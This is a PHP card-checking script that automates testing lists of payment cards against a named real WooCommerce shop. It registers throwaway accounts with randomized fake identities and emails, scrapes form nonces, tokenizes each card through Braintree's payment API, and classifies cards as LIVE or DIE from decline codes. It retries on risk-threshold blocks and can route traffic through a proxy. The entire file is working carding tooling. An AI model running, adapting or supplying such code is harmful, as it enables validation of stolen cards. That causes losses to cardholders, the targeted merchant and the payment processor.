<?php
$start = microtime(true);
$tag = 'DEV API @KGGS01 REVIEWED BY @WSLZIMMOSILVA';

$proxyAuth = '';
$proxy = '';

$used_emails = [];

function request($url, $post = null, $headers = [], $cookies = null, $follow = true, $timeout = 45) {
    global $proxy, $proxyAuth;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $follow);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
    
    $default_headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    $all_headers = array_merge($default_headers, $headers);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $all_headers);
    
    if ($post) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
    if ($cookies) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
    }

    $resp = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) return ['body' => '', 'http_code' => 0, 'error' => $error];
    return ['body' => $resp, 'http_code' => $http_code, 'error' => null];
}

function getstr($str, $start, $end) {
    $exp = explode($start, $str, 2);
    if (count($exp) < 2) return '';
    $exp2 = explode($end, $exp[1], 2);
    return $exp2[0];
}

function getCardType($cc) {
    if (preg_match('/^4/', $cc)) return "visa";
    if (preg_match('/^5[1-5]/', $cc)) return "master";
    if (preg_match('/^3[47]/', $cc)) return "amex";
    if (preg_match('/^6(?:011|5)/', $cc)) return "discover";
    return "desconhecida";
}

function randomName() {
    $first = ['John','Mike','Dave','James','Rob','Will','Joe','Tom','Chris','Kevin','Brian','Mark','Paul','Steve','Dan',
              'Alex','Jordan','Taylor','Morgan','Casey','Riley','Jessie','Jamie','Cameron','Dakota','Avery','Quinn'];
    $last = ['Smith','Jones','Brown','Davis','Miller','Wilson','Moore','Taylor','Anderson','Thomas','Jackson','White',
             'Harris','Martin','Thompson','Garcia','Martinez','Robinson','Clark','Rodriguez','Lewis','Lee','Walker','Hall'];
    return $first[array_rand($first)] . ' ' . $last[array_rand($last)];
}

function randomAddress() {
    $streets = ['Main St', 'Maple Ave', 'Oak St', 'Pine St', 'Cedar St', 'Elm St', 'Washington Ave', 'Park Ave'];
    $cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego'];
    $states = ['NY', 'CA', 'IL', 'TX', 'AZ', 'PA', 'TX', 'CA'];
    $zip = rand(10001, 99999);
    $street_num = rand(100, 9999);
    $street = $streets[array_rand($streets)];
    $city = $cities[array_rand($cities)];
    $state = $states[array_rand($states)];
    return [
        'address' => "$street_num $street",
        'city' => $city,
        'state' => $state,
        'postcode' => $zip,
        'country' => 'US'
    ];
}

function randomEmail(&$used_emails) {
    $weird_domains = [
        'weirdmail.xyz', 'strangebox.net', 'creepymail.org', 'oddpost.co',
        'bizarremail.fun', 'ghostmail.io', 'freakmail.club', 'unstable.zone',
        'mysterious.cool', 'shadowmail.me', 'cryptic.space', 'phantomalley.com',
        'nebulamail.org', 'spectre.in', 'vortexmail.co', 'abyssbox.net'
    ];
    
    $length = rand(8, 20);
    $username = '';
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    for ($i = 0; $i < $length; $i++) {
        $username .= $chars[random_int(0, strlen($chars) - 1)];
    }
    $username .= rand(100, 9999);
    
    if (rand(0, 1)) {
        $domain = $weird_domains[array_rand($weird_domains)];
    } else {
        $tlds = ['com', 'net', 'org', 'co', 'xyz', 'fun', 'io', 'hud', 'zap', 'ninja', 'club', 'zone'];
        $dom_name = '';
        $dom_len = rand(5, 12);
        for ($i = 0; $i < $dom_len; $i++) {
            $dom_name .= $chars[random_int(0, strlen($chars) - 1)];
        }
        $tld = $tlds[array_rand($tlds)];
        $domain = $dom_name . '.' . $tld;
    }
    
    $email = $username . '@' . $domain;
    while (in_array($email, $used_emails)) {
        $email = $username . rand(1000, 999999) . '@' . $domain;
    }
    $used_emails[] = $email;
    return $email;
}

function randomPhone() {
    return '212' . rand(100, 999) . rand(1000, 9999);
}

function createAccountAndAddress($cookies_file, &$used_emails, $max_retries = 2) {
    $attempt = 0;
    while ($attempt < $max_retries) {
        $attempt++;
        $email = randomEmail($used_emails);
        $name = randomName();
        $address = randomAddress();
        $phone = randomPhone();
        $name_parts = explode(' ', $name);
        $first_name = $name_parts[0];
        $last_name = $name_parts[1] ?? 'Smith';

        $page = request('https://www.dnalasering.com/my-account/', null, [], $cookies_file, false);
        if ($page['error']) {
            if ($attempt == $max_retries) return ['error' => 'Falha ao acessar my-account: ' . $page['error']];
            continue;
        }
        $html = $page['body'];
        $reg_nonce = getstr($html, 'name="woocommerce-register-nonce" value="', '"');
        if (!$reg_nonce) {
            if ($attempt == $max_retries) return ['error' => 'Não foi possível obter nonce de registro'];
            continue;
        }

        $post = http_build_query([
            'email' => $email,
            'woocommerce-register-nonce' => $reg_nonce,
            'register' => 'Register'
        ]);
        $reg = request('https://www.dnalasering.com/my-account/', $post, ['Content-Type: application/x-www-form-urlencoded'], $cookies_file, true);
        if ($reg['error']) {
            if ($attempt == $max_retries) return ['error' => 'Falha no registro: ' . $reg['error']];
            continue;
        }

        usleep(rand(500000, 1500000));

        $addr_page = request('https://www.dnalasering.com/my-account/edit-address/billing/', null, [], $cookies_file, false);
        if ($addr_page['error']) {
            if ($attempt == $max_retries) return ['error' => 'Falha ao acessar edit-address: ' . $addr_page['error']];
            continue;
        }
        $html = $addr_page['body'];
        $addr_nonce = getstr($html, 'name="woocommerce-edit-address-nonce" value="', '"');
        if (!$addr_nonce) {
            if ($attempt == $max_retries) return ['error' => 'Não foi possível obter nonce de endereço'];
            continue;
        }

        $post_addr = http_build_query([
            'billing_first_name' => $first_name,
            'billing_last_name' => $last_name,
            'billing_country' => $address['country'],
            'billing_address_1' => $address['address'],
            'billing_city' => $address['city'],
            'billing_state' => $address['state'],
            'billing_postcode' => $address['postcode'],
            'billing_phone' => $phone,
            'billing_email' => $email,
            'save_address' => 'Save address',
            'woocommerce-edit-address-nonce' => $addr_nonce,
            'action' => 'edit_address'
        ]);
        $save = request('https://www.dnalasering.com/my-account/edit-address/billing/', $post_addr, ['Content-Type: application/x-www-form-urlencoded'], $cookies_file, true);
        if ($save['error']) {
            if ($attempt == $max_retries) return ['error' => 'Falha ao salvar endereço: ' . $save['error']];
            continue;
        }

        $shipping_page = request('https://www.dnalasering.com/my-account/edit-address/shipping/', null, [], $cookies_file, false);
        if (!$shipping_page['error']) {
            $html = $shipping_page['body'];
            $shipping_nonce = getstr($html, 'name="woocommerce-edit-address-nonce" value="', '"');
            if ($shipping_nonce) {
                $post_shipping = http_build_query([
                    'shipping_first_name' => $first_name,
                    'shipping_last_name' => $last_name,
                    'shipping_country' => $address['country'],
                    'shipping_address_1' => $address['address'],
                    'shipping_city' => $address['city'],
                    'shipping_state' => $address['state'],
                    'shipping_postcode' => $address['postcode'],
                    'save_address' => 'Save address',
                    'woocommerce-edit-address-nonce' => $shipping_nonce,
                    'action' => 'edit_address'
                ]);
                request('https://www.dnalasering.com/my-account/edit-address/shipping/', $post_shipping, ['Content-Type: application/x-www-form-urlencoded'], $cookies_file, true);
                usleep(rand(300000, 800000));
            }
        }

        return ['email' => $email, 'name' => $name, 'address' => $address];
    }
    return ['error' => 'Não foi possível criar conta após ' . $max_retries . ' tentativas'];
}

function extractStatus($response_body) {
    if (preg_match('/c[óo]digo\s*de\s*status\s*:?\s*(\d{4}:\s*[^<>\n]+)/i', $response_body, $matches)) {
        return trim($matches[1]);
    }
    if (preg_match('/Status\s*code\s*:?\s*(\d{4}:\s*[^<>\n]+)/i', $response_body, $matches)) {
        return trim($matches[1]);
    }
    if (preg_match('/c[óo]digo\s*de\s*status\s*:?\s*(\d{4})/i', $response_body, $matches)) {
        return $matches[1];
    }
    if (preg_match('/Status\s*code\s*:?\s*(\d{4})/i', $response_body, $matches)) {
        return $matches[1];
    }
    if (stripos($response_body, 'risk_threshold') !== false) {
        if (preg_match('/(\d{4})\s*risk_threshold/i', $response_body, $code_match)) {
            return $code_match[1] . ': risk_threshold';
        }
        if (preg_match('/risk_threshold\s*(\d{4})/i', $response_body, $code_match)) {
            return $code_match[1] . ': risk_threshold';
        }
        if (preg_match('/<div class="woocommerce-error">(.*?)<\/div>/s', $response_body, $msg_match)) {
            $msg = trim(strip_tags($msg_match[1]));
            if (preg_match('/\b(\d{4})\b/', $msg, $msg_code)) {
                return $msg_code[1] . ': ' . $msg;
            }
            return $msg;
        }
        return 'risk_threshold';
    }
    if (strpos($response_body, 'Duplicate card exists in the vault') !== false) {
        return 'Duplicate card exists in the vault';
    }
    if (preg_match('/<div class="woocommerce-error">(.*?)<\/div>/s', $response_body, $matches)) {
        $msg = trim(strip_tags($matches[1]));
        if (preg_match('/\b(\d{4})\b/', $msg, $code_match)) {
            return $code_match[1] . ': ' . $msg;
        }
        return $msg;
    }
    if (preg_match('/<div class="woocommerce-message">(.*?)<\/div>/s', $response_body, $matches)) {
        return trim(strip_tags($matches[1]));
    }
    if (preg_match_all('/\b(\d{4})\b/', $response_body, $all_matches)) {
        foreach ($all_matches[1] as $num) {
            if ($num < 2024 || $num > 2030) return $num;
        }
        return $all_matches[1][0];
    }
    return 'Status desconhecido';
}

if (!isset($_GET['lista']) && !isset($_POST['lista'])) die("usa ?lista=CARD|MES|ANO|CVV");

$cartoes_input = $_GET['lista'] ?? $_POST['lista'] ?? '';
$cartoes = explode(',', $cartoes_input);

if (!is_dir(__DIR__ . '/cookies')) mkdir(__DIR__ . '/cookies', 0777, true);

foreach ($cartoes as $cartao_raw) {
    $cartao = str_replace([' ', ':', ';', ',', '-'], '|', trim($cartao_raw));
    if (!preg_match("/[0-9]{15,16}\|[0-9]{1,2}\|[0-9]{2,4}\|[0-9]{3,4}/", $cartao)) {
        echo "ERRO FORMATO » $cartao_raw\n";
        continue;
    }
    list($cc, $mes, $ano, $cvv) = explode('|', $cartao);
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    $ano = $ano;
    $tipo = getCardType($cc);

    $max_attempts = 2;
    $attempt = 0;
    $final_status = null;
    $last_error = null;

    while ($attempt < $max_attempts) {
        $attempt++;
        $cookies_file = __DIR__ . '/cookies/' . uniqid() . '.txt';

        $account = createAccountAndAddress($cookies_file, $used_emails);
        if (isset($account['error'])) {
            $last_error = $account['error'];
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }

        $page = request('https://www.dnalasering.com/my-account/add-payment-method/', null, [], $cookies_file, false);
        if ($page['error']) {
            $last_error = "Acessar add-payment-method: " . $page['error'];
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        $html = $page['body'];
        
        $woo_nonce = getstr($html, 'name="woocommerce-add-payment-method-nonce" value="', '"');
        $correlation = getstr($html, '"correlation_id":"', '"');
        if (!$woo_nonce) {
            $last_error = "Não foi possível extrair nonce de pagamento";
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        if (!$correlation) $correlation = 'b017bd54-d3fd-4882-be1b-1c5d4a96';

        $client_token_nonce = getstr($html, 'client_token_nonce":"', '"');
        if (!$client_token_nonce) {
            preg_match('/client_token_nonce":"([^"]+)"/', $html, $matches);
            $client_token_nonce = $matches[1] ?? '';
            if (!$client_token_nonce) {
                $last_error = "Não foi possível extrair client_token_nonce";
                if (file_exists($cookies_file)) unlink($cookies_file);
                break;
            }
        }

        $ajax = request('https://www.dnalasering.com/wp-admin/admin-ajax.php',
            'action=wc_braintree_credit_card_get_client_token&nonce=' . $client_token_nonce,
            ['Content-Type: application/x-www-form-urlencoded', 'X-Requested-With: XMLHttpRequest'],
            $cookies_file, false);
        if ($ajax['error']) {
            $last_error = "Falha no AJAX: " . $ajax['error'];
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        
        $ajax_data = json_decode($ajax['body'], true);
        if (!isset($ajax_data['success']) || $ajax_data['success'] !== true) {
            $last_error = "AJAX retornou erro: " . ($ajax_data['data'] ?? 'unknown');
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        
        $client_token_base64 = $ajax_data['data'] ?? '';
        if (!$client_token_base64) {
            $last_error = "AJAX não retornou client token (data vazio)";
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        
        $client_token_data = base64_decode($client_token_base64);
        if (!$client_token_data) {
            $last_error = "Falha ao decodificar client token base64";
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        
        $auth = '';
        $token_json = json_decode($client_token_data, true);
        if ($token_json && isset($token_json['authorizationFingerprint'])) {
            $auth = $token_json['authorizationFingerprint'];
        } else {
            if (preg_match('/authorizationFingerprint":"([^"]+)"/', $client_token_data, $matches)) {
                $auth = $matches[1];
            } elseif (preg_match('/authorizationFingerprint[\s]*:[\s]*"([^"]+)"/', $client_token_data, $matches)) {
                $auth = $matches[1];
            } elseif (preg_match('/"authorizationFingerprint":"(.*?)"/', $client_token_data, $matches)) {
                $auth = $matches[1];
            }
        }
        
        if (!$auth) {
            $last_error = "Não foi possível extrair authorizationFingerprint do client token";
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }

        $guid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
            mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000,
            mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));

        $graphql = [
            "clientSdkMetadata" => [
                "source" => "client",
                "integration" => "custom",
                "sessionId" => $guid
            ],
            "query" => "mutation TokenizeCreditCard(\$input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: \$input) { token } }",
            "variables" => [
                "input" => [
                    "creditCard" => [
                        "number" => $cc,
                        "expirationMonth" => $mes,
                        "expirationYear" => $ano,
                        "cvv" => $cvv
                    ],
                    "options" => ["validate" => false]
                ]
            ],
            "operationName" => "TokenizeCreditCard"
        ];

        $bt_headers = [
            'Authorization: Bearer ' . $auth,
            'Braintree-Version: 2018-05-10',
            'Content-Type: application/json',
            'Origin: https://assets.braintreegateway.com',
            'Referer: https://assets.braintreegateway.com/'
        ];

        $bt_result = request('https://payments.braintree-api.com/graphql', json_encode($graphql), $bt_headers, null, false);
        if ($bt_result['error']) {
            $last_error = "Tokenização GraphQL: " . $bt_result['error'];
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }
        $bt_data = json_decode($bt_result['body'], true);
        $token = $bt_data['data']['tokenizeCreditCard']['token'] ?? '';
        if (!$token) {
            $last_error = "Não foi possível obter token do cartão via GraphQL";
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }

        $post_data = [
            'payment_method' => 'braintree_credit_card',
            'wc-braintree-credit-card-card-type' => $tipo,
            'wc_braintree_credit_card_payment_nonce' => $token,
            'wc_braintree_device_data' => json_encode(['correlation_id' => $correlation]),
            'wc-braintree-credit-card-tokenize-payment-method' => 'true',
            'woocommerce-add-payment-method-nonce' => $woo_nonce,
            '_wp_http_referer' => '/my-account/add-payment-method/',
            'woocommerce_add_payment_method' => '1'
        ];

        $headers_post = [
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.dnalasering.com',
            'Referer: https://www.dnalasering.com/my-account/add-payment-method/',
        ];

        $final = request('https://www.dnalasering.com/my-account/add-payment-method/', http_build_query($post_data), $headers_post, $cookies_file, true);
        if ($final['error']) {
            $last_error = "Envio do nonce: " . $final['error'];
            if (file_exists($cookies_file)) unlink($cookies_file);
            break;
        }

        $response_body = $final['body'];
        $full_status = extractStatus($response_body);

        if (file_exists($cookies_file)) unlink($cookies_file);

        $is_pure_risk = (stripos($full_status, 'risk_threshold') !== false && !preg_match('/^\d{4}/', $full_status));
        if ($is_pure_risk && $attempt < $max_attempts) {
            continue;
        }
        
        $final_status = $full_status;
        $classification = 'DIE';
        if (preg_match('/(\d{4})/', $full_status, $matches)) {
            if ($matches[1] === '2001' || $matches[1] === '2010' || $matches[1] === '2108' || $matches[1] === '2106') {
                $classification = 'LIVE';
            }
        }
        break;
    }

    if ($final_status === null) {
        $final_status = $last_error ?: 'ERRO: Falha após ' . $max_attempts . ' tentativas';
        $classification = 'DIE';
    }

    $time = round(microtime(true) - $start, 2);
    echo "$classification | $cartao | $final_status | {$time}s\n";
}
?>